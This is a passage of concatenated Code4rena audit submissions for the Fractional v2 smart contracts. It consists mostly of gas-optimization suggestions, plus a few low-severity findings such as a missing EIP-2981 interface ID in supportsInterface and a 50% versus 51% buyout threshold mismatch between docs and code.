https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IBuyout.sol#L123 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IMigration.sol#L100 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IModule.sol#L8 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IVault.sol#L49 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IVault.sol#L64 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IERC1155.sol#L29  Source https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#use-calldata-instead-of-memory-for-function-parameters  ## Recommended Mitigation Steps  Change function arguments from memory to calldata  # [G-07] For loop incrementing can be unsafe  For loops that use i++ do not need to use safemath for this operation because the loop would run out of gas long before this point. Making this addition operation unsafe using unchecked saves gas.  Sample code to make the for loop increment unsafe ``` for (uint i = 0; i < length; i = unchecked_inc(i)) {     // do something that doesn't change the value of i }  function unchecked_inc(uint i) returns (uint) {     unchecked {         return i + 1;     } } ```  Idea borrowed from https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#the-increment-in-for-loop-post-condition-can-be-made-unchecked  Locations where this was found include https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L339 https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L363 https://github.com/code-423n4/2022-07-fractional/tree/main/src/Vault.sol#L78 https://github.com/code-423n4/2022-07-fractional/tree/main/src/Vault.sol#L104  ## Recommended Mitigation Steps  Make the increment in for loops unsafe to save gas  # [G-08] Use iszero assembly for zero checks  Comparing a value to zero can be done using the `iszero` EVM opcode. This can save gas  Source from t11s https://twitter.com/transmissions11/status/1474465495243898885  Locations where this was found include https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L59 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L64 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L117 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L154 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L189 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L249 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L256 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L281 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L320 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L352 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L388 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L425 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Migration.sol#L82 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Migration.sol#L114 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Migration.sol#L146 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Migration.sol#L187 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Migration.sol#L299 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Migration.sol#L436 https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L276 https://github.com/code-423n4/2022-07-fractional/tree/main/src/Vault.sol#L124 https://github.com/code-423n4/2022-07-fractional/tree/main/src/Vault.sol#L136 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/Multicall.sol#L23 https://github.com/code-423n4/2022-07-fractional/tree/main/src/VaultRegistry.sol#L42 https://github.com/code-423n4/2022-07-fractional/tree/main/src/VaultRegistry.sol#L120  ## Recommended Mitigation Steps  Use the assembly `iszero` evm opcode to compare values to zero  # [G-09] Save gas with unchecked  Use unchecked math when there is no overflow risk to save gas. Before index is decreased in remove it is checked for zero condition. This means index will not underflow and can be unchecked.  Locations where this was found include https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L86-L87  ## Recommended Mitigation Steps  Add unchecked around math that can't overflow for gas savings. In Solidity before 0.8.0, use the normal math operators instead of safe math functions.  # [G-10] Add payable to constructors that won't receive ETH  Identifying a constructor as payable saves gas. Constructors should only be called by the admin or deployer and should not mistakenly receive ETH. Constructors can be payable to save gas.  Locations where this was found include https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/protoforms/BaseVault.sol#L24 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Minter.sol#L17 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L42 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Migration.sol#L53 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/MerkleBase.sol#L8 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/Metadata.sol#L16 https://github.com/code-423n4/2022-07-fractional/tree/main/src/references/SupplyReference.sol#L15 https://github.com/code-423n4/2022-07-fractional/tree/main/src/VaultRegistry.sol#L28 https://github.com/code-423n4/2022-07-fractional/tree/main/src/VaultFactory.sol#L20 https://github.com/code-423n4/2022-07-fractional/tree/main/src/targets/Supply.sol#L16  ## Recommended Mitigation Steps  Add payable to these functions for gas savings  # [G-11] Use internal function in place of modifier  An internal function can save gas vs. a modifier. A modifier inlines the code of the original function but an internal function does not.  Source https://blog.polymath.network/solidity-tips-and-tricks-to-save-gas-and-reduce-bytecode-size-c44580b218e6#dde7  Locations where this was found include https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L37 https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L45  ## Recommended Mitigation Steps  Use internal functions in place of modifiers to save gas.  # [G-12] Use uint not bool  Booleans are more expensive than uint256 or any type that takes up a full word because each write operation emits an extra SLOAD to first read the slot's contents, replace the bits taken up by the boolean, and then write back. This is the compiler's defense against contract upgrades and pointer aliasing, and it cannot be disabled.  Locations where this was found include https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L102 https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L148 https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L189 https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L328 https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L353 https://github.com/code-423n4/2022-07-fractional/tree/main/src/Vault.sol#L53 https://github.com/code-423n4/2022-07-fractional/tree/main/src/Vault.sol#L117 https://github.com/code-423n4/2022-07-fractional/tree/main/src/constants/Permit.sol#L11 https://github.com/code-423n4/2022-07-fractional/tree/main/src/constants/Permit.sol#L16 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/SafeSend.sol#L20 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/Multicall.sol#L18 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/SelfPermit.sol#L21 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/SelfPermit.sol#L48 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IMigration.sol#L26 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IMigration.sol#L32 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IMigration.sol#L98 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IMigration.sol#L140 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IMigration.sol#L143 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IFERC1155.sol#L40 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IFERC1155.sol#L84 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IFERC1155.sol#L94 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IFERC1155.sol#L117 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IVault.sol#L45 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IERC721.sol#L14 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IERC721.sol#L47 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IERC1155.sol#L9 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IERC1155.sol#L52  ## Recommended Mitigation Steps  Replace bool variables with uints  # [G-13] Use Solidity errors instead of require  Solidity errors introduced in version 0.8.4 can save gas on revert conditions https://blog.soliditylang.org/2021/04/21/custom-errors/ https://twitter.com/PatrickAlphaC/status/1505197417884528640  Locations where this was found include https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L263 https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L275 https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L297 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/MerkleBase.sol#L62 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/MerkleBase.sol#L78  ## Recommended Mitigation Steps  Replace require blocks with new solidity errors described in https://blog.soliditylang.org/2021/04/21/custom-errors/  # [G-14] Bitshift for divide by 2  When multiply or dividing by a power of two, it is cheaper to bitshift than to use standard math operations.  There is a divide by 2 operation on these lines https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/MerkleBase.sol#L100 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/MerkleBase.sol#L136 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/MerkleBase.sol#L142  ## Recommended Mitigation Steps  Bitshift right by one bit instead of dividing by 2 to save gas  # [G-15] Non-public variables save gas  Many constant variables are public, but changing the visibility of these variables to private or internal can save gas.  Locations where this was found include https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L15 https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L17 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L35 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L37 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Migration.sol#L43  ## Recommended Mitigation Steps  Declare some public variables as private or internal to save gas  # [G-16] Write contracts in vyper  The contracts are all written entirely in solidity. Writing contracts with vyper instead of solidity can save gas.  Source https://twitter.com/eiber_david/status/1515737811881807876 doggo demonstrates https://twitter.com/fubuloubu/status/1528179581974417414?t=-hcq_26JFDaHdAQZ-wYxCA&s=19  ## Recommended Mitigation Steps  Write some or all of the contracts in vyper to save gas
# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/main/src/FERC1155.sol#L31-L34   # Vulnerability details  ## Impact  The [EIP-2981: NFT Royalty Standard](https://eips.ethereum.org/EIPS/eip-2981) implementation is incomplete, missing the implementation of `function supportsInterface(bytes4 interfaceID) external view returns (bool);` from the [EIP-165: Standard Interface Detection](https://eips.ethereum.org/EIPS/eip-165)  ## Proof of Concept  A marketplace implemented royalties could check if the NFT have royalties, but if don't add the interface of `ERC2981` on the `_registerInterface`, the marketplace can't know if this NFT haves  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Like in [solmate ERC1155.sol](https://github.com/Rari-Capital/solmate/blob/03e425421b24c4f75e4a3209b019b367847b7708/src/tokens/ERC1155.sol#L137-L146) add the `ERC2981` interfaceId on the `FERC1155` contract ```solidity     /*//////////////////////////////////////////////////////////////                               ERC165 LOGIC     //////////////////////////////////////////////////////////////*/      function supportsInterface(bytes4 interfaceId) public view  override returns (bool) {         return             super.supportsInterface(interfaceId) ||             interfaceId == 0x2a55205a; // ERC165 Interface ID for ERC2981     } ```  
## Low severity: BaseVault.sol deployVault() will revert if there are more than 6 Permissions in _modules  The list of Permission hashes is fixed at length 6 in generateMerkleTree [here](https://github.com/code-423n4/2022-07-fractional/blob/f862c14f86adf7de232cd4e9cca6b611e6023b98/src/modules/protoforms/BaseVault.sol#L128): ``` hashes = new bytes32[](6); ```  However the _modules passed to deployVault might have more Permissions than 6.   **If there are more than 6 Permissions deployVault() will revert with raiseOutOfBounds**.  Consider counting up the number of Permissions first before creating the hashes array. Migration.generateMerkleTree does this [here]( https://github.com/code-423n4/2022-07-fractional/blob/f862c14f86adf7de232cd4e9cca6b611e6023b98/src/modules/Migration.sol#L487): ``` uint256 treeLength; uint256 modulesLength = _modules.length;  unchecked {     for (uint256 i; i < modulesLength; ++i) {         treeLength += IModule(_modules[i]).getLeafNodes().length;     } } ```  Marking low severity as if this limit is hit, a new protoform contract could be built, deployed and used. ie. it's not built into core contracts like the VaultRegistry.  ## Non-critical (until gas costs change): Vault.sol gas reserve setting not future proof'd like the one in PRBProxy  From the prb-proxy repo [README.md](https://github.com/paulrberg/prb-proxy/blob/main/README.md) `A minimum gas reserve is saved in storage such that the proxy does not become unusable if EVM opcode gas costs change in the future.`  In Vault.sol it's a `constant` so can't be modified in the future without redeploying the Vault and VaultFactory contracts.  This was probably done to save gas but consider making it modifiable for the future. Some Vault's will continue working for a long time and it's possible gas costs will change again in the future.  In the worst case the Vaults would fail to execute transactions due to out of gas failures.  **I marked this non-critical but if opcode costs were to change this could potentially become a high or critical.**  NOTE: This issue could also apply to `COST_PER_WORD` in Transfer.sol however there is a path to swap plugins and migrate Vaults to use new modules so it's less of an issue in contracts like Transfer.  ## Non-critical: FERC1155.sol implements EIP-2981 but does not include it in supportsInterface  There is no mention of the EIP2981 standard in the docs or code but the FERC1155 does implement that standard.  So it would benefit from returning true for calls to `supportsInterface(0x2a55205a)`. see https://eips.ethereum.org/EIPS/eip-2981 for details of the interface.  With that in place exchanges can see the standard is supported and attempt to honor the royalty setting.  ## Non-critical: Buyout percentage inconsistency between docs and code  The docs mention 51% as the required buyout threshold multiple times. For example `If a pool has more than 51% of the total supply after 4 days, the buyout is successful`. See https://docs.fractional.art/fractional-v2-1/smart-contracts/modules/buyout.  However the Buyout.sol logic uses 50%. For example see the check in the end() function here: https://github.com/code-423n4/2022-07-fractional/blob/f862c14f86adf7de232cd4e9cca6b611e6023b98/src/modules/Buyout.sol#L211.  Update either the docs or the code so they are consistently using one of either 50% or 51%.  ## Non-critical: Vault.sol state variable nonce can be bool  `nonce` in Vault.sol is used as a flag to indicate if the Vault has been initialized or not. However it's stored as a uint256.  Changing it to a bool would make it's purpose and usage a little clearer. It would also save 20k deployment gas if the `nonce` declaration was moved above `merkleRoot` when changed to bool. This is because it can share a slot with the address `owner`.  ## Non-critical: IBuyout.sol duplicates 2 functions from the parent IModule.sol  Functions `getLeafNodes` an `getPermissions` can be removed from IBuyout.sol as they are already defined in the parent contract IModule.sol. 
# Gas Report  ## Table of Contents  - [Array length should not be looked up in every iteration](#array-length-should-not-be-looked-up-in-every-iteration) - [Bytes constant are cheaper than string constants](#bytes-constants-are-cheaper-than-string-constants) - [Caching storage variables in local variables to save gas](#caching-storage-variables-in-local-variables-to-save-gas) - [Caching mapping accesses in local variables to save gas](#caching-mapping-accesses-in-local-variables-to-save-gas) - [Calldata instead of memory for RO function parameters](#calldata-instead-of-memory-for-ro-function-parameters) - [Constant expressions](#constant-expressions) - [Constants can be private](#constants-can-be-private) - [Custom errors](#custom-errors) - [Empty blocks should emit an event](#empty-blocks-should-emit-an-event) - [Event fields are redundant](#event-fields-are-redundant) - [Functions with access control cheaper if payable](#functions-with-access-control-cheaper-if-payable) - [Immutable variables save storage](#immutable-variables-save-storage) - [Inline functions](#inline-functions) - [Mathematical optimizations](#mathematical-optimizations) - [Modifier instead of duplicate require](#modifier-instead-of-duplicate-require) - [Prefix increments](#prefix-increments) - [Revert strings length](#revert-strings-length) - [Shifting cheaper than division](#shifting-cheaper-than-division) - [Storage cheaper than memory](#storage-cheaper-than-memory) - [Storage pointer for structs](#storage-pointer-for-structs) - [Transfers should be avoided if amount null](#transfers-should-be-avoided-if-amount-null) - [unchecked arithmetic](#unchecked-arithmetic) - [unnecessary computation](#unnecessary-computation)   # Array length should not be looked up in every iteration  ## IMPACT  It wastes gas to read an array's length in every iteration of a `for` loop, even if it is a memory or calldata array: `3` gas per read.   ## PROOF OF CONCEPT  8 instances:  ### src/modules/Buyout.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L454 ```cpp 454:         for (uint256 i; i < permissions.length; ) ```  ### src/modules/protoforms/BaseVault.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L64 ```cpp 64:         for (uint256 i = 0; i < _tokens.length; ) ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L83 ```cpp 83:         for (uint256 i = 0; i < _tokens.length; ) ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L107 ```cpp 107:         for (uint256 i = 0; i < _tokens.length; ++i) ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L130 ```cpp 130:             for (uint256 i; i < _modules.length; ++i)  ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L132 ```cpp 132:             for (uint256 j; j < leaves.length; ++j)  ```  ### src/utils/MerkleBase.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L51 ```cpp 51:             for (uint256 i = 0; i < _proof.length; ++i) ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L110 ```cpp 110:             for (uint256 i; i < result.length; ++i) ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  Caching the length in a variable before the `for` loop   # Bytes constant are cheaper than string constants  ## IMPACT  If the string can fit into 32 bytes, then `bytes32` is cheaper than `string`. `string`  is a dynamically sized-type, which has current limitations in Solidity compared to a statically sized variable.    ## PROOF OF CONCEPT  2 instances:  ### src/FERC1155.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L15 ```cpp 15:     string public constant NAME = "FERC1155"; ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L17 ```cpp 15:     string public constant VERSION = "1"; ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  Replace `string constant` with `bytes(1..32) constant`  # Caching storage variables in local variables to save gas  ## IMPACT  Anytime you are reading from storage more than once, it is cheaper in gas cost to cache the variable: a SLOAD cost 100gas, while MLOAD and MSTORE cost 3 gas.  In particular, in `for` loops, when using the length of a storage array as the condition being checked after each loop, caching the array length can yield significant gas savings if the array length is high  ## PROOF OF CONCEPT  15 instances:  ### src/modules/Buyout.sol  scope: `end()`  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L186 - `registry` is read twice:  ```cpp 186:         (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault); 210:                IVaultRegistry(registry) ```  scope: `cash()`  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L246 - `registry` is read twice:  ```cpp 246:         (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault); 267:        uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault); ```  scope: `redeem()`  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L280 - `registry` is read twice:  ```cpp 280:         (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault); 288:         uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault); ```  scope: `getPermissions()`  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L476 - `supply` is read twice:  ```cpp 476:             supply, 477:             ISupply(supply).burn.selector ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L482 - `transfer` is read 8 times:  ```cpp 482:             transfer, 483:             ITransfer(transfer).ERC20Transfer.selector 488:             transfer, 489:             ITransfer(transfer).ERC721TransferFrom.selector 494:             transfer, 495:             ITransfer(transfer).ERC1155TransferFrom.selector 500:             transfer, 501:             ITransfer(transfer).ERC1155BatchTransferFrom.selector ```   ### src/modules/Migrations.sol  scope: `propose()`  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L81 - `registry` is read twice:  ```cpp 81:         (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault); 95:         proposal.oldFractionSupply = IVaultRegistry(registry).totalSupply(_vault); ```  scope: `commit()`  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L184 - `registry` is read twice:  ```cpp 184:         (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault); 200:             IVaultRegistry(registry).totalSupply(_vault) ```  - `buyout` is read twice in the conditionnal `if` block:  ```cpp 208:             IFERC1155(token).setApprovalFor(address(buyout), id, true) 210:             IBuyout(buyout).start{value: proposal.totalEth}(_vault); ```  scope: `settleVault()`  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L232 - `proposal.modules` is read twice:  ```cpp 232:         bytes32[] memory merkleTree = generateMerkleTree(proposal.modules); 247:             proposal.modules ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L237 - `proposal.plugins` is read twice:  ```cpp 237:             proposal.plugins 248:             proposal.plugins ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L238 - `proposal.selectors` is read twice:  ```cpp 238:             proposal.selectors 249:             proposal.selectors ```   scope: `settleFractions()`  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L273 - `proposal.newVault` is read twice:  ```cpp 273:             proposal.newVault 283:             proposal.newVault ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L275 - `proposal.newFractionSupply` is read twice:  ```cpp 275:             proposal.newFractionSupply 285:             proposal.newFractionSupply ```  scope: `migrateFractions()`  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L435 - `registry` is read 3 times:  ```cpp 435:         (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault) 467:         (address token, uint256 newFractionId) = IVaultRegistry(registry) 470:         uint256 newTotalSupply = IVaultRegistry(registry).totalSupply(newVault) ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L438 - `buyout` is read twice:  ```cpp 438:         (, address proposer, State current, , , ) = IBuyout(buyout).buyoutInfo(_vault) 447:         (, , , , , uint256 lastTotalSupply) = IBuyout(buyout).buyoutInfo(_vault); ```   ## TOOLS USED  Manual Analysis  ## MITIGATION  cache these storage variables using local variables.  # Caching mapping accesses in local variables to save gas  ## IMPACT  Anytime you are reading from a mapping value more than once, it is cheaper in gas cost to cache it, by saving one `gkeccak256` operation - `30` gas.   ## PROOF OF CONCEPT  1 instance:  ### src/FERC1155.sol  scope: `uri()`  - `metadata[_id]` is read twice:  ```cpp 297:        require(metadata[_id] != address(0), "NO METADATA"); 298:         return IFERC1155(metadata[_id]).uri(_id) ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  cache these mapping accesses using local variables.  # Calldata instead of memory for RO function parameters  ## PROBLEM  If a reference type function parameter is read-only, it is cheaper in gas to use calldata instead of memory. Calldata is a non-modifiable, non-persistent area where function arguments are stored, and behaves mostly like memory,but it alleviates the compiler from the `abi.decode()` step that copies each index of the calldata to the memory index, each iteration costing `60` gas.   ## PROOF OF CONCEPT  20 instances:  ### src/FERC1155.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L68 ```cpp 68:     function emitSetURI(uint256 _id, string memory _uri)  ```  ### src/Vault.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L73 ```cpp 73:     function install(bytes4[] memory _selectors, address[] memory _plugins) ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L101 ```cpp 101:     function uninstall(bytes4[] memory _selectors) ```  ### src/VaultRegistry.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultRegistry.sol#L53 ```cpp 53:         address[] memory _plugins 54:         bytes4[] memory _selectors ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultRegistry.sol#L70 ```cpp 70:         address[] memory _plugins 71:         bytes4[] memory _selectors ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultRegistry.sol#L85 ```cpp 85:         address[] memory _plugins 86:         bytes4[] memory _selectors ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultRegistry.sol#L105 ```cpp 105:         address[] memory _plugins 106:         bytes4[] memory _selectors ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultRegistry.sol#L150 ```cpp 150:         address[] memory _plugins 151:         bytes4[] memory _selectors ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultRegistry.sol#L168 ```cpp 168:         address[] memory _plugins 169:         bytes4[] memory _selectors ```  ### src/modules/Migration.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L487 ```cpp 487:     function generateMerkleTree(address[] memory _modules) ```  ### src/utils/MerkleBase.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L44 ```cpp 44:     function verifyProof(bytes32[] memory _proof) ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L125 ```cpp 125:     function hashLevel(bytes32[] memory _data) ```  ### src/utils/Metadata.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/Metadata.sol#L24 ```cpp 24:     function setURI(uint256 _id, string memory _uri)  ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  Replace `memory` with `calldata`   # Constant expressions  ## IMPACT  Constant expressions are [re-calculated each time they are in use](https://github.com/ethereum/solidity/issues/9232), costing an extra `97` gas than a constant every time they are called.   ## PROOF OF CONCEPT  3 instances include:  ### src/constants/Permit.sol  ```cpp 5: bytes32 constant DOMAIN_TYPEHASH = keccak256( 6:     "EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)" 7: ); 8:  9: /// @dev The EIP-712 typehash for the permit struct used by the contract 10: bytes32 constant PERMIT_TYPEHASH = keccak256( 11:     "Permit(address owner,address operator,uint256 tokenId,bool approved,uint256 nonce,uint256 deadline)" 12: ); 13:  14: /// @dev The EIP-712 typehash for the permit all struct used by the contract 15: bytes32 constant PERMIT_ALL_TYPEHASH = keccak256( 16:     "PermitAll(address owner,address operator,bool approved,uint256 nonce,uint256 deadline)" 17: ); ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  Mark these as `immutable` instead of `constant`  # Constants can be private  ## IMPACT  Marking constants as `private` save gas upon deployment, as the compiler does not have to create getter functions for these variables. It is worth noting that a `private` variable can still be read using either the verified contract source code or the bytecode. This may affect readability so this is left at the team's discretion  ## PROOF OF CONCEPT  6 instances:  ### src/VaultRegistry.sol  ```cpp 17:     address public immutable factory; 18:     /// @notice Address of FERC1155 token contract 19:     address public immutable fNFT; 20:     /// @notice Address of Implementation for FERC1155 token contract 21:     address public immutable fNFTImplementation; ```  ### src/modules/Buyout.sol  ```cpp 35:    uint256 public constant PROPOSAL_PERIOD = 2 days; 36:     /// @notice Time length of the rejection period 37:     uint256 public constant REJECTION_PERIOD = 4 days; ```  ### src/modules/Migration.sol  ```cpp 43:     uint256 public constant PROPOSAL_PERIOD = 7 days; ```    ## TOOLS USED  Manual Analysis  ## MITIGATION  Make the constants `private` instead of `public`   # Custom Errors  ## IMPACT  Custom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met) while providing the same amount of information, as explained [here](https://blog.soliditylang.org/2021/04/21/custom-errors/)  Custom errors are defined using the error statement  ## PROOF OF CONCEPT  5 instances:  ### src/FERC1155.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L263-L268 ```cpp 263:         require( 264:             msg.sender == _from || 265:                 isApprovedForAll[_from][msg.sender] || 266:                 isApproved[_from][msg.sender][_id], 267:             "NOT_AUTHORIZED" 268:         ) ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L275-L286 ```cpp 275:         require( 276:             _to.code.length == 0 